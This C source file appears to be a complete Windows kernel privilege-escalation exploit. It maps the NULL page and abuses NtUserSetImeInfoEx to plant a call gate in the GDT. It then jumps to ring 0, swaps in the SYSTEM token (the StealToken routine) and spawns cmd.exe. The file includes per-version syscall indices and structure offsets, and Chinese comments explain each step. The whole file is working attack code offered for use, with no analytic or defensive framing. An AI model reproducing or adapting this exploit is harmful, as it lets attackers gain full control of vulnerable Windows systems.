#include "exploit.h"
PVOID _PsInitialSystemProcess = NULL;
pfnPsReferencePrimaryToken _PsReferencePrimaryToken = NULL;
pfnZwQuerySystemInformation _ZwQuerySystemInformation = NULL;
pfnRtlCreateUnicodeStringFromAsciiz _RtlCreateUnicodeStringFromAsciiz = NULL;
pfnLdrLoadDll _LdrLoadDll = NULL;
pfnLdrUnloadDll _LdrUnloadDll = NULL;
pfnNtAllocateVirtualMemory  _NtAllocateVirtualMemory = NULL;
PVOID  _RtlAdjustPrivilege = NULL;

void  __declspec(naked) xxxNtUserSetImeInfoEx()
{
	_asm
	{
		mov		eax, IndexOfNtUserSetImeInfoEx
		mov     edx, 7FFE0300h
		call    dword ptr[edx]
		retn 4
	}
}
int main()
{
	HWINSTA hWS = CreateWindowStationW(NULL, 0, GENERIC_READ, NULL);
	if (!init())
	{
		printf("init failed\r\n");
		return 0;
	}
	AddVectoredExceptionHandler(1, VectoredHandler1);
	DWORD_PTR prevMask = SetThreadAffinityMask(GetCurrentThread(), 1);  //gdt是per processor一个的,确保当前线程只会在修改了gdt的processor执行
	printf("thread prev mask:0x%08x\n", prevMask);

	UCHAR gtdr1[6] = { 0 };
	ULONG GdtAddr = 0;
	_asm {
		sgdt  fword ptr gtdr1
	}
	GdtAddr = *((PULONG)&gtdr1[2]);
	printf("addrGdt:%#p\n", GdtAddr);
	DWORD Base = 0x100;
	SYSTEM_INFO si = { 0 };
	GetSystemInfo(&si);
	NTSTATUS Status = _NtAllocateVirtualMemory(
		GetCurrentProcess(),
		(PVOID *)&Base, //round down,所以基地址应该会在0处
		0,
		&si.dwPageSize,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_READWRITE
	);
	if (!NT_SUCCESS(Status) || Base != 0)
	{
		printf("NtAllocateVirtualMemory ret:0x%08x, failed:0x%08x\n", Status, GetLastError());
		return 1;
	}
	else
	{
		PIMEINFOEX fake =(PIMEINFOEX)malloc(0x400);
		memset(fake, 0, 0x400);
		xxxSetFakeImeInfo(fake, (INT)GdtAddr, FALSE);
		*(DWORD *)(Base + 0x14) = (DWORD)fake->hkl; // //向[14h]处写入0  tagIMEINFOEX.hkl 
		*(DWORD *)(Base + 0x2c) = GdtAddr + 0x154;     // 向[2ch]处写入80b95154
		printf("ready to trigger!\n");

		if (hWS == NULL)
		{
			printf("step one failed!\n");
			return 1;
		}
		if (SetProcessWindowStation(hWS))
		{
			_asm push fake
			xxxNtUserSetImeInfoEx();   //利用漏洞将fake赋值到gdt表,从而添加call gate
			xxxChangeToken();//进入ring 0 修改进程安全令牌

			memset(fake, 0, 0x400);				 // 恢复Gdt
			xxxSetFakeImeInfo(fake, (INT)GdtAddr, TRUE);
			_asm push fake
			xxxNtUserSetImeInfoEx();
			printf("done!\n");
			CloseWindowStation(hWS);
			free(fake);
			STARTUPINFO si = { 0 };
			si.cb = sizeof(STARTUPINFO);
			PROCESS_INFORMATION pi = { 0 };
			CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
			MessageBoxA(NULL, "Done", "Done", MB_OK);
		}
		else
		{
			printf("step two failed!\n");
			return 1;
		}
	}
	return 0;
}

BOOL init()
{
	BOOL bOk = FALSE;
	VersionCheck();
	_PsInitialSystemProcess = ExportFromKernel("PsInitialSystemProcess");
	_PsReferencePrimaryToken = (pfnPsReferencePrimaryToken)ExportFromKernel("PsReferencePrimaryToken");
	if (_PsInitialSystemProcess != NULL && _PsReferencePrimaryToken != NULL)
	{
		bOk = TRUE;
	}
	return bOk;

}

INT VersionCheck()
{
	INT version = GetVersionNum();
	switch (version)
	{
	case 5:
		IndexOfNtUserSetImeInfoEx = 0x1226;
		offset_KPROCESS_in_ETHREAD = 0x150;
		dword_40F150 = 0xB8;
		dword_40F154 = 0x16C;
		break;
	case 3:
		IndexOfNtUserSetImeInfoEx = 0x1205;
		offset_KPROCESS_in_ETHREAD = 0x220;
		dword_40F150 = 0x88;
		dword_40F154 = 0x174;
		break;
	case 4:
		IndexOfNtUserSetImeInfoEx = 0x121B;
		offset_KPROCESS_in_ETHREAD = 0x144;
		dword_40F150 = 0xA0;
		dword_40F154 = 0x14C;
		break;
	case 2:
		IndexOfNtUserSetImeInfoEx = 0x1202;
		offset_KPROCESS_in_ETHREAD = 0x128;
		dword_40F150 = 0x98;
		dword_40F154 = 0x164;
		break;
	default:
		break;
	}
	return 1;
}

INT GetVersionNum()
{
	INT result = 0;
	OSVERSIONINFOA osvi;
	ZeroMemory(&osvi, sizeof(OSVERSIONINFOA));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA);

	if (GetVersionExA(&osvi))
	{
		switch (osvi.dwMajorVersion)
		{
		case 3:
			return 9;
		case 4:
		case 5:
			if (osvi.dwMinorVersion)
			{
				if (osvi.dwMinorVersion == 1)
				{
					result = 3;
				}
				else
				{
					if (osvi.dwMinorVersion != 2)break;
					result = 2;
				}
			}
			else
			{
				result = 1;
			}
			return result;
		case 6:
			if (osvi.dwMinorVersion)
			{
				if (osvi.dwMinorVersion != 1)break;
				result = 5;
			}
			else
			{
				result = 4;
			}
			break;
		default:
			break;
		}
	}
	return result;
}

PVOID ExportFromKernel(const LPSTR name)
{
	ULONG ReturnLength = 0;
	INT32 Base = 0;
	HMODULE ntdll = NULL;
	UNICODE_STRING ModuleNameW;
	ULONG DllCharacteristics = 1;
	PVOID DllBase = NULL;
	if (_ZwQuerySystemInformation == NULL || _RtlCreateUnicodeStringFromAsciiz == NULL || _LdrLoadDll == NULL || _LdrUnloadDll == NULL || _NtAllocateVirtualMemory == NULL || _RtlAdjustPrivilege == NULL)
	{
		ntdll = LoadLibraryA("ntdll.dll");
		_ZwQuerySystemInformation = (pfnZwQuerySystemInformation)GetProcAddress(ntdll, "ZwQuerySystemInformation");
		_RtlCreateUnicodeStringFromAsciiz = (pfnRtlCreateUnicodeStringFromAsciiz)GetProcAddress(ntdll, "RtlCreateUnicodeStringFromAsciiz");
		_LdrLoadDll = (pfnLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
		_LdrUnloadDll = (pfnLdrUnloadDll)GetProcAddress(ntdll, "LdrUnloadDll");
		_NtAllocateVirtualMemory = (pfnNtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
		_RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
	}
	if (_ZwQuerySystemInformation(SystemModuleInformation, NULL, NULL, &ReturnLength) != STATUS_INFO_LENGTH_MISMATCH)
	{
		return NULL;
	}
	SYSTEM_MODULE_INFORMATION* modules = (SYSTEM_MODULE_INFORMATION*)malloc(ReturnLength);
	if (modules == NULL)
	{
		return NULL;
	}
	if (!NT_SUCCESS(_ZwQuerySystemInformation(SystemModuleInformation, modules, ReturnLength, NULL)))
	{
		free(modules);
		return NULL;
	}
	Base = (INT32)modules->Module[0].Base;
	_RtlCreateUnicodeStringFromAsciiz(&ModuleNameW, &modules->Module[0].ImageName[21]);
	free(modules);
	if (_LdrLoadDll(NULL, &DllCharacteristics, &ModuleNameW, &DllBase) != STATUS_SUCCESS)
	{
		int a = GetLastError();
		return NULL;
	}
	DWORD Rva = (DWORD)GetProcAddress((HMODULE)DllBase, name);
	if (!Rva)
	{
		return NULL;
	}
	DWORD Result = Base - (DWORD)DllBase + Rva;
	if (!NT_SUCCESS(_LdrUnloadDll(DllBase)))
	{
		printf("LdrUnload Faild!\r\n");
	}
	return (PVOID)Result;


}

LONG WINAPI VectoredHandler1(
	struct _EXCEPTION_POINTERS *ExceptionInfo
)
{
	LONG result = 0;
	if (ExceptionInfo->ExceptionRecord->ExceptionCode == 0xE06D7363)
	{
		result = EXCEPTION_EXECUTE_HANDLER;
	}
	else
	{
		ExceptionInfo->ContextRecord->Eip = (DWORD)GetProcAddress(GetModuleHandleA("kernel32.dll"), "ExitThread");
		result = EXCEPTION_CONTINUE_EXECUTION;
	}
	return EXCEPTION_CONTINUE_SEARCH;
}




DWORD __stdcall xxxChangeToken()
{
	HANDLE hProcess = NULL;
	if (DuplicateHandle(GetCurrentProcess(), GetCurrentProcess(), GetCurrentProcess(), &hProcess, GENERIC_ALL, FALSE, DUPLICATE_SAME_ACCESS))
	{
		PVOID EPROCESS = GetHandleAddress(hProcess);
		printf("addrProcess:0x%08x\n", EPROCESS);
		Sleep(1000);
		if (EPROCESS == NULL)
		{
			return 0;
		}
		WORD CallGateSelector[3];
		CallGateSelector[0] = 0x0;
		CallGateSelector[1] = 0x0;
		CallGateSelector[2] = 0x1a0;
		DWORD CurrentCs = 0;
		_asm {
			call fword ptr[CallGateSelector];
			mov eax, [esp]
			mov CurrentCs, eax
			add esp, 4
			push EPROCESS
			call StealToken
			mov eax, CurrentCs
			push eax
			push offset label
			retf 
	label :
			xor eax,eax
		}
	}
	return 0;
}

LPVOID GetHandleAddress(HANDLE hObject)
{
	static BYTE HandleInformation[4096 * 16 * 16];
	DWORD BytesReturned;
	ULONG i;

	// Get handle information

	_ZwQuerySystemInformation(SystemHandleInformation, HandleInformation, sizeof(HandleInformation), &BytesReturned);

	// Find handle
	PSYSTEM_HANDLE_INFORMATION HandleInfo = (PSYSTEM_HANDLE_INFORMATION)HandleInformation;
	PSYSTEM_HANDLE_TABLE_ENTRY_INFO CurrentHandle = &HandleInfo->Handles[0];

	for (i = 0; i<HandleInfo->NumberOfHandles; CurrentHandle++, i++)
	{
		// Is this it?
		if (CurrentHandle->UniqueProcessId == GetCurrentProcessId() &&
			CurrentHandle->HandleValue == (USHORT)hObject)
		{
			// Yep, return
			return CurrentHandle->Object;
		}
	}
	// Nope, not found
	return NULL;
}

VOID __stdcall StealToken(PVOID EPROCESS)  //__stdcall!! 注意堆栈啊我去,崩一下午
{
	PVOID token = _PsReferencePrimaryToken((PVOID)*(DWORD*)_PsInitialSystemProcess);
	DWORD* p1 = (DWORD*)*(DWORD*)_PsInitialSystemProcess;
	DWORD* p2 = (DWORD*)EPROCESS;
	if ((*p1 & 0xFFFFFFF8) != (DWORD)token)
	{
		do
		{
			p1++;
			p2++;
		} while ((*p1 & 0xFFFFFFF8) != (DWORD)token);
	}
	*p2 = (DWORD)token;
	return;
}
VOID  xxxSetFakeImeInfo(PIMEINFOEX fake, INT GdtAddr, BOOL Recover)
{
	int * i = (int *)((PBYTE)fake + 4);
	DWORD OriginData = GdtAddr + 0x160;                   // gdtr[44]
	DWORD Loop = 0x57;                                    // 构造gdt数据
	do
	{
		*i = OriginData;
		OriginData += 8;
		i += 2;                                    // 越过一个entry
		--Loop;
	} while (Loop);
	if (!Recover)
	{
		*(DWORD *)((PBYTE)fake + 0x60) = 0xC3;  //ret指令
		*(WORD *)((PBYTE)fake + 0x4C) = GdtAddr + 0x1B4; //offset low
		*(WORD *)((PBYTE)fake + 0x52) = (unsigned int)(GdtAddr + 0x1B4) >> 16;  //offset high
		*(WORD *)((PBYTE)fake + 0x4E) = 0x1A8; //call gate的cs段选择子
		*(WORD *)((PBYTE)fake + 0x50) = 0xEC00u;//type:call gate    DPL:11(ring3)   00000000 (固定0位  + 参数个数:0)
		*(WORD *)((PBYTE)fake + 0x54) = 0xFFFFu;//limit low
		*(WORD *)((PBYTE)fake + 0x56) = 0;
		*(BYTE *)((PBYTE)fake + 0x58) = 0;//base为0
		*(BYTE *)((PBYTE)fake + 0x5B) = 0;
		*(BYTE *)((PBYTE)fake + 0x59) = 0x9Au; //cs描述符的一些flag
		*(BYTE *)((PBYTE)fake + 0x5A) = 0xCFu;
	}
}

